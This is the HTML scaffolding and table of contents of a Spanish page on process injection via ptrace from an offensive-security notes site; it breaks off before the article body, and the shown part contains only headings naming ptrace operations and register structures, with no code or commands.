
<!doctype html>
<html lang="es" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Offensive security research & notes">
      
      
      
        <link rel="canonical" href="https://0x574r.github.io/research/malware-dev/ptrace-injection/">
      
      
        <link rel="prev" href="../shellcode-basics/">
      
      
      
        
      
      
      <link rel="icon" href="../../../assets/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
    
    
      
        <title>Ptrace Injection - RAZOR</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.618322db.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      
  
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
    
      
      
    
  
  
  <style>:root{--md-admonition-icon--note:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M64%20480c-35.3%200-64-28.7-64-64V96c0-35.3%2028.7-64%2064-64h320c35.3%200%2064%2028.7%2064%2064v213.5c0%2017-6.7%2033.3-18.7%2045.3L322.7%20461.3c-12%2012-28.3%2018.7-45.3%2018.7zm325.5-176H296c-13.3%200-24%2010.7-24%2024v93.5z%22/%3E%3C/svg%3E');--md-admonition-icon--tip:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20384%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M292.9%20384c7.3-22.3%2021.9-42.5%2038.4-59.9C364%20289.7%20384%20243.2%20384%20192%20384%2086%20298%200%20192%200S0%2086%200%20192c0%2051.2%2020%2097.7%2052.7%20132.1%2016.5%2017.4%2031.2%2037.6%2038.4%2059.9h201.7zm-4.9%2048H96v16c0%2044.2%2035.8%2080%2080%2080h32c44.2%200%2080-35.8%2080-80zM184%20112c-39.8%200-72%2032.2-72%2072%200%2013.3-10.7%2024-24%2024s-24-10.7-24-24c0-66.3%2053.7-120%20120-120%2013.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024%22/%3E%3C/svg%3E');--md-admonition-icon--warning:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M256%200c14.7%200%2028.2%208.1%2035.2%2021l216%20400c6.7%2012.4%206.4%2027.4-.8%2039.5S486.1%20480%20472%20480H40c-14.1%200-27.2-7.4-34.4-19.5s-7.5-27.1-.8-39.5l216-400c7-12.9%2020.5-21%2035.2-21m0%20352a32%2032%200%201%200%200%2064%2032%2032%200%201%200%200-64m0-192c-18.2%200-32.7%2015.5-31.4%2033.7l7.4%20104c.9%2012.5%2011.4%2022.3%2023.9%2022.3%2012.6%200%2023-9.7%2023.9-22.3l7.4-104c1.3-18.2-13.1-33.7-31.4-33.7z%22/%3E%3C/svg%3E');--md-admonition-icon--danger:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M384%20144C384%2064.5%20312.4%200%20224%200S64%2064.5%2064%20144c0%2047.1%2025.1%2088.9%2064%20115.2V288c0%2017.7%2014.3%2032%2032%2032h128c17.7%200%2032-14.3%2032-32v-28.8c38.9-26.3%2064-68.1%2064-115.2m-224-16a32%2032%200%201%201%200%2064%2032%2032%200%201%201%200-64m96%2032a32%2032%200%201%201%2064%200%2032%2032%200%201%201-64%200m189.5%20179.7c-6.8-16.3-25.5-24-41.8-17.2L224%20397.3%2044.3%20322.5c-16.3-6.8-35%20.9-41.8%2017.2s.9%2035%2017.2%2041.8L140.8%20432%2019.7%20482.5c-16.3%206.8-24%2025.5-17.2%2041.8s25.5%2024%2041.8%2017.2L224%20466.7l179.7%2074.8c16.3%206.8%2035-.9%2041.8-17.2s-.9-35-17.2-41.8L307.2%20432l121.1-50.5c16.3-6.8%2024-25.5%2017.2-41.8%22/%3E%3C/svg%3E');--md-admonition-icon--info:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20512%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M256%20512a256%20256%200%201%200%200-512%20256%20256%200%201%200%200%20512m-32-352a32%2032%200%201%201%2064%200%2032%2032%200%201%201-64%200m-8%2064h48c13.3%200%2024%2010.7%2024%2024v88h8c13.3%200%2024%2010.7%2024%2024s-10.7%2024-24%2024h-80c-13.3%200-24-10.7-24-24s10.7-24%2024-24h24v-64h-24c-13.3%200-24-10.7-24-24s10.7-24%2024-24%22/%3E%3C/svg%3E');--md-admonition-icon--abstract:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M384%20512H96c-53%200-96-43-96-96V96C0%2043%2043%200%2096%200h304c26.5%200%2048%2021.5%2048%2048v288c0%2020.9-13.4%2038.7-32%2045.3V448c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032zM96%20384c-17.7%200-32%2014.3-32%2032s14.3%2032%2032%2032h256v-64zm32-232c0%2013.3%2010.7%2024%2024%2024h176c13.3%200%2024-10.7%2024-24s-10.7-24-24-24H152c-13.3%200-24%2010.7-24%2024m24%2072c-13.3%200-24%2010.7-24%2024s10.7%2024%2024%2024h176c13.3%200%2024-10.7%2024-24s-10.7-24-24-24z%22/%3E%3C/svg%3E');--md-admonition-icon--example:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M288%200H128c-17.7%200-32%2014.3-32%2032s14.3%2032%2032%2032v151.5L7.5%20426.3C2.6%20435%200%20444.7%200%20454.7%200%20486.4%2025.6%20512%2057.3%20512h333.4c31.6%200%2057.3-25.6%2057.3-57.3%200-10-2.6-19.8-7.5-28.4L320%20215.5V64c17.7%200%2032-14.3%2032-32S337.7%200%20320%200zm-96%20215.5V64h64v151.5c0%2011.1%202.9%2022.1%208.4%2031.8L306%20320H142l41.6-72.7c5.5-9.7%208.4-20.6%208.4-31.8%22/%3E%3C/svg%3E');--md-admonition-icon--quote:url('data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20viewBox%3D%220%200%20448%20512%22%3E%3C%21--%21%20Font%20Awesome%20Free%207.1.0%20by%20%40fontawesome%20-%20https%3A//fontawesome.com%20License%20-%20https%3A//fontawesome.com/license/free%20%28Icons%3A%20CC%20BY%204.0%2C%20Fonts%3A%20SIL%20OFL%201.1%2C%20Code%3A%20MIT%20License%29%20Copyright%202025%20Fonticons%2C%20Inc.--%3E%3Cpath%20d%3D%22M0%20216C0%20149.7%2053.7%2096%20120%2096h8c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032h-8c-30.9%200-56%2025.1-56%2056v8h64c35.3%200%2064%2028.7%2064%2064v64c0%2035.3-28.7%2064-64%2064H64c-35.3%200-64-28.7-64-64zm256%200c0-66.3%2053.7-120%20120-120h8c17.7%200%2032%2014.3%2032%2032s-14.3%2032-32%2032h-8c-30.9%200-56%2025.1-56%2056v8h64c35.3%200%2064%2028.7%2064%2064v64c0%2035.3-28.7%2064-64%2064h-64c-35.3%200-64-28.7-64-64z%22/%3E%3C/svg%3E');}</style>



    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"IBM Plex Sans";--md-code-font:"JetBrains Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../stylesheets/custom.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
<link rel="apple-touch-icon" sizes="180x180" href="https://0x574r.github.io/assets/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://0x574r.github.io/assets/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://0x574r.github.io/assets/favicon-16x16.png">

  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#process-injection-via-ptrace-just-asm" class="md-skip">
          Saltar a contenido
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Cabecera">
    <a href="../../.." title="RAZOR" class="md-header__button md-logo" aria-label="RAZOR" data-md-component="logo">
      
  <img src="../../../assets/logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            RAZOR
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Ptrace Injection
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Cambiar a modo claro"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Cambiar a modo claro" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Buscar">
        
        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Inicializando búsqueda
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/0x574R" title="Ir al repositorio" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    0x574R
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="RAZOR" class="md-nav__button md-logo" aria-label="RAZOR" data-md-component="logo">
      
  <img src="../../../assets/logo.png" alt="logo">

    </a>
    RAZOR
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/0x574R" title="Ir al repositorio" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
  </div>
  <div class="md-source__repository">
    0x574R
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Home
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Malware Dev
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Malware Dev
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Malware Development
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../shellcode-basics/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Shellcode Basics
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    Ptrace Injection
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    Ptrace Injection
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Tabla de contenidos
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduccion" class="md-nav__link">
    <span class="md-ellipsis">
      
        Introducción
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Introducción">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#por-que-es-importante" class="md-nav__link">
    <span class="md-ellipsis">
      
        ¿Por qué es importante?
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#por-que-ensamblador-puro" class="md-nav__link">
    <span class="md-ellipsis">
      
        ¿Por qué ensamblador puro?
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#la-syscall-ptrace" class="md-nav__link">
    <span class="md-ellipsis">
      
        La Syscall ptrace
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="La Syscall ptrace">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#prototipo" class="md-nav__link">
    <span class="md-ellipsis">
      
        Prototipo
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#operaciones-de-ptrace-utilizadas" class="md-nav__link">
    <span class="md-ellipsis">
      
        Operaciones de ptrace utilizadas
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Operaciones de ptrace utilizadas">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ptrace_attach-16-0x10" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_ATTACH (16 / 0x10)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_getregs-12-0x0c" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_GETREGS (12 / 0x0C)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_setregs-13-0x0d" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_SETREGS (13 / 0x0D)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_peekdata-2-0x02" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_PEEKDATA (2 / 0x02)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_pokedata-5-0x05" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_POKEDATA (5 / 0x05)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_singlestep-9-0x09" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_SINGLESTEP (9 / 0x09)
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ptrace_detach-17-0x11" class="md-nav__link">
    <span class="md-ellipsis">
      
        PTRACE_DETACH (17 / 0x11)
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#estructura-user_regs_struct" class="md-nav__link">
    <span class="md-ellipsis">
      
        Estructura user_regs_struct
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#consideraciones-sobre-little-endian" class="md-nav__link">
    <span class="md-ellipsis">
      
        Consideraciones sobre Little-Endian
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
